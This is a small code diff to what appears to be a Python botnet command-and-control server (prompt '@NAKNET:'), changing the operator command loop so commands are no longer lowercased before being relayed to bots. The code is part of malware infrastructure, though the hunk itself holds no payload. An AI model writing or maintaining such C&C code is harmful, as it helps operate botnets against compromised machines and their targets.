@@ -240,7 +240,7 @@ def Commander(sock,rlock):#cnc server
 	while True:
 		#print ("==> Python3 C&C server <==")
 		sock.send((str(name)+'@NAKNET:').encode())#if u run this on windows, it may has some bug, idk why.
-		cmd_str = ReadSocket(sock,1024).lower()
+		cmd_str = ReadSocket(sock,1024)#.lower()
 		if len(cmd_str):
 			if cmd_str[0] == '!':
 				SendCmd(cmd_str,sock,rlock)
